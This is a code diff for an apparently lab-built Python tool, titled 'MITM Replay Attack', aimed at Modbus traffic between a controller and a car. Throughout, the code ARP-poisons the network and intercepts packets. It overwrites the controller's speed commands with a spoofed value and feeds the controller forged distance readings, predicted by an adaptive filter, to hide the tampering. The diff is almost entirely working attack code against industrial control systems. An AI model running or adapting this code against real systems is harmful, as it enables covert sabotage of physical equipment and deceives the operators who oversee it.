@@ -15,9 +15,10 @@ import netifaces
 import adaptfilt as adf
 import numpy as np
 import matplotlib.pyplot as plt
+from math import fabs
 
-import sys
 from gi.repository import GLib, Gtk, GObject
+import sys
 
 start_time = 0
 
@@ -83,16 +84,22 @@ class firFilterDB(object):
     def __init__(self):
         self.distance = []
         self.speed = []
+        self.currentspeed = []
+        self.currentdistance = []
         self.ticks = 0
         self.predicted= []
         self.filterOrder = 32
+        self.padded = False
+        self.predicting = False
+        self.direction = None
+        self.olddist = None
 
     def extractValues(self,session,seq):
         slaveIp = session.carIP
         masterIp = session.controlIP
         lastSpeed = None
         lastDistance = None
-        for packet in seq:
+        for packet in seq[::-1]:
             if(packet[IP].src == slaveIp and packet.funcCode == 4):
                 #Packet from car, with distance data
                 self.distance.append(packet.registerVal[1])
@@ -175,8 +182,7 @@ def app_main():
     win = Gtk.Window(default_height=400, default_width=800, title="MITM Replay Attack")
     win.set_border_width(10)
     win.connect("delete-event", Gtk.main_quit)
-    guiVars = guiValues()
-
+    
     progress = Gtk.ProgressBar(show_text=False)
     maingrid = Gtk.Grid(column_homogeneous=True,column_spacing=0, row_spacing=0)
     win.add(maingrid)
@@ -258,6 +264,8 @@ def app_main():
         threadAtt.start()
         return False
 
+    
+
     def printTV(text):
         GLib.idle_add(printConsole,text)
 
@@ -285,53 +293,41 @@ def app_main():
         systemForward(True)
         sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketLearning, store=0, count=MaxCount)
         cs.resetSession()
-        print("Number of Packets Captures: %s" % len(lv.fullSeq))
+        printTV("Number of Packets Captures: %s" % len(lv.fullSeq))
         firDB = firFilterDB()
         firDB.extractValues(cs,lv.fullSeq)
         print("Distance")
         print(firDB.distance)
         print(firDB.speed)
-        print("FIR Attack, Length of Data Distance: %s Speed: %s" % (len(firDB.distance),len(firDB.speed)))
+        printTV("FIR Attack, Length of Data Distance: %s Speed: %s" % (len(firDB.distance),len(firDB.speed)))
         GLib.idle_add(enableAttGui)
         sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketAttacking, store=0, count=MaxCount)
-        print("************[ATTACKING] Attack Finished***************")
+        printTV("************[ATTACKING] Attack Finished***************")
         guiVars.status = "CLEANING ARP"
         arpClear()
         guiVars.status = "IDLE"
-        plt.plot(firDB.distance, label="readings")
-        plt.plot(firDB.predicted, label="predicted")
-        plt.legend(loc='best')
-        plt.show()
-
-def get_mac(IP):
-    os.popen('ping -c 1 %s' % IP)
-    conf.verb = 0
-    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
-    for snd,rcv in ans:
-        mac = rcv.sprintf(r"%Ether.src%")
-        return mac
-
-def getHwAddr(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
-    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
-    return mac
+        # plt.plot(firDB.currentdistance, label="readings")
+        # plt.plot(firDB.predicted, label="predicted")
+        # plt.legend(loc='best')
+        # print(len(firDB.currentspeed))
+        # plt.show()
 
 def initializeAttack(intrfc):
     global cs, guiVars, interface
     interface = intrfc
-    print "INITIALIZING"
+    guiVars.status = "INITIALIZING"
     attackerMAC=getHwAddr(interface)
     socket = conf.L2socket(iface=interface)
     carMAC = get_mac(carIP)
     controlMAC = get_mac(controlIP)
     cs = Session(attackerMAC,carMAC,controlMAC,socket,carIP,controlIP)
-    print "IDLE"
+    guiVars.status = "IDLE"
 
 def classifyPacket(packet):
     global cs, lv, start_time
     pkt_funcCode = packet.funcCode
     pkt_src = packet[IP].src
+    guiVars.status = "LEARNING"
     if not (cs.startRecording):
         if (cs.synced):
             print("[LOG_LEARNING] SYNCING")
@@ -394,7 +390,7 @@ def handlePacketAttacking(pkt):
     global cs, lv, av, FUNC_CODE_PRINT, guiVars, firDB
     cs.starttime = time.time() * 1000
     pkt_src = pkt[IP].src
-    print "ATTACKING"
+    guiVars.status = "ATTACKING"
     if (pkt_src == cs.controlIP):
         dstHA = cs.carMAC
     elif (pkt_src == cs.carIP):
@@ -413,50 +409,76 @@ def handlePacketAttacking(pkt):
         pkt_funcCode = pkt.funcCode
         if (pkt_funcCode == FUNC_READ_SR and pkt_src == cs.carIP):
             distance = pkt.registerVal[1]
-            if(distance < 200 and distance > 40):
+            if(distance < 170 and distance > 50):
                 av.controlling = True
                 cs.distanceAsked = False
                 cs.directionASked = False
+                firDB.olddist = distance
                 print("========================= **ATTACKER INITIALIZIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
+        elif(pkt_funcCode == FUNC_WRITE_SR):
+            firDB.currentspeed.append(pkt.registerValue)
+            # print "speed"
         if cs.packetCount%2 == 0:
             poisonARP(1, False)
         return False
 
-    pkt_funcCode = pkt.funcCode
-    localcount = av.packetCount + 1
-    if(localcount == len(lv.fullSeq) - 1): return True;
-    while not (pkt_funcCode == lv.fullSeq[localcount].funcCode and pkt_src == lv.fullSeq[localcount][IP].src):
+    try:
+        pkt_funcCode = pkt.funcCode
+    except:
+        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
+        if cs.packetCount%2 == 0:
+            poisonARP(1, False)
+        return False
+    while not (pkt_funcCode == lv.fullSeq[av.packetCount].funcCode and pkt_src == lv.fullSeq[av.packetCount][IP].src):
         #This small loop adjust the sequence of packages so it matches the current conversation between the controller and the car
-        if(localcount == len(lv.fullSeq) - 1): return True;
-        localcount += 1
+        if(av.packetCount == len(lv.fullSeq) - 1): return True;
+        av.packetCount += 1
     
     print("[ATTACKING] INTERCEPTED TO: " + pkt[IP].dst + " FUNC: " + FUNC_CODE_PRINT[pkt_funcCode] +" FORWARDING TO: " + lv.fullSeq[av.packetCount][IP].dst + " FUNC: " + FUNC_CODE_PRINT[lv.fullSeq[av.packetCount].funcCode])
     if (pkt_src == cs.controlIP):
         if(pkt_funcCode == FUNC_WRITE_SR):
+            firDB.currentspeed.append(pkt.registerValue)
             pkt.registerValue = guiVars.spoofedspeed
 
         forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
         dstHA = cs.controlMAC
         ############################################
         localcount = av.packetCount
+        if(localcount == len(lv.fullSeq) - 1): return True;
         while not (lv.fullSeq[localcount][IP].src == cs.carIP and lv.fullSeq[localcount].funcCode == pkt_funcCode):
            #print("Packet from: %s command: %s not matched with src: %s command: %s" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode],lv.fullSeq[localcount][IP].src,FUNC_CODE_PRINT[lv.fullSeq[localcount].funcCode]) )
            if(localcount == len(lv.fullSeq) - 1): return True;
            localcount += 1
         #print("*******************Packet from: %s command: %s MATCHED!!! with src: %s command: %s" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode],lv.fullSeq[localcount][IP].src,FUNC_CODE_PRINT[lv.fullSeq[localcount].funcCode]) )
-        if (pkt_funcCode == FUNC_READ_SR and firDB.ticks > firDB.filterOrder + 2):
-            print("Predicting answer")
+        if (pkt_funcCode == 4):
+            # print("Predicting answer, ticks: " + str(len(firDB.currentspeed)))
             newpkt = lv.fullSeq[localcount]
-            newpkt.registerVal[1] = firGetValue(firDB,firDB.ticks)
+            oldval = newpkt.registerVal[1]
+            firDB.currentdistance.append(oldval)
+            newpkt.registerVal[1] = firGetValue(firDB,firDB.olddist)
+            print("---------------------------------------------- Predicting %s compared to: %s" % (newpkt.registerVal[1],oldval))
+            pkt = forge(pkt,newpkt)
+            #firDB.ticks += 1
+        elif(pkt_funcCode == 1):
+            newpkt = lv.fullSeq[localcount]
+            newpkt.coilStatus[0] = firDB.direction
             pkt = forge(pkt,newpkt)
         else:
+            #print("Waiting to fill filter taps, ticks: " + str(firDB.ticks))
             pkt = forge(pkt,lv.fullSeq[localcount])
         #############################################
         forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
     else:
         # All the car responses are going to be dropped since the connection now has been completely taken by the attacker
-        if(pkt_funcCode == FUNC_READ_SR): firDB.ticks += 1
-        print("Packet from: %s command: %s DROPPED" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode]) )
+        if(pkt_funcCode == 4): 
+            firDB.ticks += 1
+            localcount = av.packetCount
+            if(localcount == len(lv.fullSeq) - 1): return True;
+            while not (lv.fullSeq[localcount][IP].src == cs.controlIP and lv.fullSeq[localcount].funcCode == pkt_funcCode):
+                if(localcount == len(lv.fullSeq) - 1): return True;
+                localcount += 1
+            firDB.currentdistance.append(lv.fullSeq[localcount])
+        #print("Packet from: %s command: %s DROPPED" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode]) )
     
     if cs.packetCount%2 == 0:
         poisonARP(1, False)
@@ -464,36 +486,78 @@ def handlePacketAttacking(pkt):
 
 
 
-def firGetValue(firobj,position):
+def firGetValue(firobj,dist):
     #geny = np.array([])
-    global firDB
+    global firDB, lv
     input = firobj.currentspeed
     output = firobj.distance
     filter_order = firobj.filterOrder
-    input_long = 64
+    input_long = 48
     i = 0
     answer = 0
-    print("len out " + str(len(output)))
-    print("len in " + str(len(input)))
+    # print("len out " + str(len(output)))
+    # print("len in " + str(len(input)))
 
     if not(firDB.padded):
         for j in range(0,filter_order):
             #geny = np.append(geny,0)
             firDB.predicted.append(0)
             i += 1
+        oldlong = 1 if (len(firDB.currentspeed) >= 32) else 32 - len(firDB.currentspeed)
         firDB.padded = True
-        firDB.currentspeed = firDB.speed[len(firDB.speed)-33:len(firDB.speed)-1] + firDB.currentspeed
+        coordinated = False
+        estimation = 0
+        while not coordinated:
+            auxarr = firDB.speed[len(firDB.speed)-oldlong:len(firDB.speed)-1] + firDB.currentspeed
+            oldestimation = estimation
+            estimation = firGetValueManual(auxarr,output)
+            print("Correcting %s to adapt to %s" % (estimation,dist))
+            if(fabs(estimation-dist)>4):
+                oldlong += 2
+                if(oldlong > len(firDB.speed)-1):
+                    coordinated = True
+                    auxarr = firDB.speed[len(firDB.speed)-22:len(firDB.speed)-1] + firDB.currentspeed
+            else:
+                coordinated = True
+        firDB.distance = firDB.distance + firDB.distance + firDB.distance
+        firDB.direction = estimation < oldestimation
+        firDB.currentspeed = auxarr
 
     input = firobj.currentspeed
     for j in range(filter_order,len(input) if len(input) < len(output) else len(output)):
         start = 0 if j < input_long else j - input_long
-        y, e, w = adf.lms(input[start:j],output[start:j],filter_order,0.000002)
+        y, e, w = adf.lms(input[start:j],output[start:j],filter_order,0.0000007) #0.0000008
         answer = y[len(y)-1]
-    if ( answer > 255 ): answer = 255
-    if ( answer < 0 ): answer = 0
+    # print("Predicting %s *********************************************************" % answer)
+    if answer < 0: answer = 0
+    if answer > 255: answer = 255
+    if(answer >= lv.distanceThresMax-4):
+        firDB.direction = True
+    elif(answer <= lv.distanceThresMin+4):
+        firDB.direction = False
+    firDB.olddist = answer
     firDB.predicted.append(int(answer))
     return int(answer)
-    
+
+
+def firGetValueManual(inarr,outarr):
+    global firDB
+    input = inarr
+    output = outarr
+    filter_order = firDB.filterOrder
+    input_long = 48
+    i = 0
+    answer = 0
+        
+    for j in range(filter_order,len(input) if len(input) < len(output) else len(output)):
+        start = 0 if j < input_long else j - input_long
+        y, e, w = adf.lms(input[start:j],output[start:j],filter_order,0.0000008) #0.0000008
+        answer = y[len(y)-1]
+    # print("Predicting %s *********************************************************" % answer)
+    if answer < 0: answer = 0
+    if answer > 255: answer = 255
+    return int(answer)
+
 
 def poisonARP(nb=3, doSleep=False, sleepTime=0.3):
     for i in range(0, nb):
@@ -593,19 +657,39 @@ def insertValue(packet,value):
     elif (pkt_funcCode == FUNC_READ_COIL):
         packet.coilStatus[0] = value
     return packet
-##############################################################
+    ##############################################################
 
-    
 
+def get_mac(IP):
+    os.popen('ping -c 1 %s' % IP)
+    conf.verb = 0
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+    for snd,rcv in ans:
+        mac = rcv.sprintf(r"%Ether.src%")
+        return mac
+
+def getHwAddr(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
+    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+    return mac
 
 if __name__ == "__main__":
     # Calling GObject.threads_init() is not needed for PyGObject 3.10.2+
     global cs, lv, av, guiVars, firDB
-    interface = sys.argv[1]
-    guiVars = guiValues()
     lv = LearningVector()
     av = AttackVector()
-    initializeAttack(interface)
+    guiVars = guiValues()
+
+    interface = sys.argv[1]
+    print "INITIALIZING"
+    attackerMAC=getHwAddr(interface)
+    socket = conf.L2socket(iface=interface)
+    carMAC = get_mac(carIP)
+    controlMAC = get_mac(controlIP)
+    cs = Session(attackerMAC,carMAC,controlMAC,socket,carIP,controlIP)
+    print "IDLE"
+
     print "POISONING"
     poisonARP(2, False)
     #Enable system packet forwarding
@@ -624,7 +708,3 @@ if __name__ == "__main__":
     print "CLEANING ARP"
     arpClear()
     print "IDLE"
-    # plt.plot(firDB.distance, label="readings")
-    # plt.plot(firDB.predicted, label="predicted")
-    # plt.legend(loc='best')
-    # plt.show()
